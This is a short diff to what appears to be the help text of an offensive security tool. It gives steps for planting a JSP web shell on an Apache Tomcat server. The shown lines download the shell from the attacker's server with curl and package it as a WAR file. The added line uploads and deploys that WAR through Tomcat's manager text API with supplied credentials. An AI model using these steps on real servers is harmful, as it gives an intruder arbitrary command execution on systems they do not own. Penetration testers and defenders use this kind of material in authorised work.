@@ -3,7 +3,8 @@
         mkdir webshell
         curl {{datastore.srvhost_url}}/shells/shell.jsp > webshell/index.jsp
         jar -cvf webshell.war -C webshell .
-    Navigate to the tomcat manager and select the WAR file to upload and select deploy
+    Navigate to the tomcat manager and select the WAR file to upload and select deploy, or with the text API:
+        curl --upload-file ./webshell.war "http://10.10.10.10:8080/manager/text/deploy?path=/webshell&update=true" -u 'user:pass'
 -->
 
 <h2>Arbitrary commands</h2>
